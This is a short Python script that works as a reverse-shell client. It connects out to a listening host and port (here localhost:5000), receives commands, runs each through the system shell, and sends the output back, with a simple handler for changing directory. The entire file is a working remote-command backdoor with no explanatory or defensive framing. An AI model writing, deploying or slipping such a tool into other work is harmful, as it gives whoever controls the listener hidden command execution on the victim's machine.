import os
import socket
import subprocess

s = socket.socket()
host = 'localhost'
port = 5000
s.connect((host, port))

def send_data(data):
	try:
		output_str = subprocess.check_output(data, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)	
		s.send(output_str)
	except Exception:
		pass
def main_loop():
	while True:
		data = s.recv(1024).decode('utf-8')
		if 'cd' in data:
			if data == 'cd':
				send_data(data)
			else:
				path = data.split()
				os.chdir(path[1])
				send_data('cd')


		if len(data) > 0:
			send_data(data)

if __name__ == '__main__':
	main_loop()

	# Close the connection
	s.close()